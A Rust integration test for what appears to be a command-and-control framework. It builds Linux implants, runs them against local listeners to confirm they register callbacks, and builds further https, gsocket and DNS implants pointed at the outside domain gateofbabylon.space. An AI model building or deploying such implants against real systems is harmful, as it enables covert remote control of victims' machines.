use naughtywolf::db;
use naughtywolf::db::repositories::Repository;
use naughtywolf::payload::{self, BuildRequest};
use std::sync::Arc;
use std::time::Duration;
use tokio::net::TcpListener;

#[tokio::test]
#[ignore = "spawns real toolchain builds and child implants; run on demand to validate built payloads actually run"]
async fn built_payloads_connect_and_register_a_callback() {
    let pool = db::create_pool("sqlite::memory:").await.unwrap();
    db::run_migrations(&pool).await.unwrap();
    let repository = Repository { pool };

    let http_listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let http_port = http_listener.local_addr().unwrap().port();
    let psk = b"smoke-payload-psk";
    let http_psk = Arc::new(psk.to_vec());
    let http_app = naughtywolf::c2::router(http_psk).with_state(repository.clone());
    let http_server = tokio::spawn(async move {
        axum::serve(http_listener, http_app).await.unwrap();
    });

    tokio::time::sleep(Duration::from_millis(300)).await;

    // protocols whose transport a plain local listener can terminate
    for protocol in ["http", "tcp"] {
        let tcp_listener = if protocol == "http" {
            http_port
        } else {
            let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
            let port = listener.local_addr().unwrap().port();
            let serve_repository = repository.clone();
            let server_protocol = protocol.to_owned();
            tokio::spawn(async move {
                naughtywolf::c2_tcp::serve_tcp_listener(
                    serve_repository,
                    psk.to_vec().into(),
                    listener,
                    server_protocol,
                )
                .await
            });
            port
        };

        let meta = payload::build(
            &BuildRequest {
                name: format!("smoke-{protocol}"),
                lhost: "127.0.0.1".into(),
                lport: tcp_listener,
                protocol: protocol.into(),
                gsocket_secret: None,
                gsocket_local_port: None,
                os: "linux".into(),
                arch: "amd64".into(),
                interval_ms: 1000,
                jitter_ms: 0,
                target: String::new(),
            },
            psk,
        )
        .await
        .unwrap_or_else(|e| panic!("build {protocol} payload failed: {e}"));

        let binary = std::path::Path::new("payloads").join(&meta.file);
        let state_directory =
            std::env::temp_dir().join(format!("nw-smoke-{protocol}-{}", meta.file));
        let mut child = tokio::process::Command::new(&binary)
            .env("NW_STATE_DIR", &state_directory)
            .spawn()
            .unwrap_or_else(|e| panic!("spawn built {protocol} implant failed: {e}"));

        let count_before: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM callbacks")
            .fetch_one(&repository.pool)
            .await
            .unwrap();
        tokio::time::sleep(Duration::from_secs(8)).await;
        let _ = child.kill().await;
        let _ = child.wait().await;
        let _ = std::fs::remove_dir_all(&state_directory);
        let _ = std::fs::remove_file(&binary);
        let _ = std::fs::remove_file(format!("{}.json", binary.display()));

        let count_after: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM callbacks")
            .fetch_one(&repository.pool)
            .await
            .unwrap();
        assert!(
            count_after > count_before,
            "{protocol} payload ran but no callback was registered"
        );
    }

    // build-only transports: https needs a TLS front, gs needs the gsocket
    // relay, dns speaks UDP DNS TXT queries; all infra-gated
    for (protocol, gsocket_secret, gsocket_local_port, lhost, lport) in [
        ("https", None, None, "gateofbabylon.space", 443),
        (
            "gs",
            Some("smoke-relay-secret".into()),
            Some(4630),
            "gateofbabylon.space",
            4630,
        ),
        ("dns", None, None, "127.0.0.1", 5353),
    ] {
        let meta = payload::build(
            &BuildRequest {
                name: format!("smoke-{protocol}"),
                lhost: lhost.into(),
                lport,
                protocol: protocol.into(),
                gsocket_secret,
                gsocket_local_port,
                os: "linux".into(),
                arch: "amd64".into(),
                interval_ms: 1000,
                jitter_ms: 0,
                target: String::new(),
            },
            psk,
        )
        .await
        .unwrap_or_else(|e| panic!("build {protocol} payload failed: {e}"));
        let binary = std::path::Path::new("payloads").join(&meta.file);
        assert!(binary.is_file(), "{protocol} artifact missing after build");
        std::fs::remove_file(&binary).unwrap();
        std::fs::remove_file(format!("{}.json", binary.display())).unwrap();
    }

    http_server.abort();
}
